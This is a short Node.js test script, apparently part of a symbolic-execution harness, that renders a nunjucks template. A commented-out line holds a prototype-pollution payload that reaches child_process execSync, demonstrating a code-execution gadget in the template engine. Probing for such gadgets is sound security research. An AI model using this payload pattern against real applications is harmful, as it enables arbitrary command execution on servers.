const nunjucks = require("nunjucks");

// Object.prototype.content = " function(){ return global.process.mainModule.require('child_process').execSync('touch a.txt') }() ";
try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

nunjucks.compile(" {{ content }} ").render();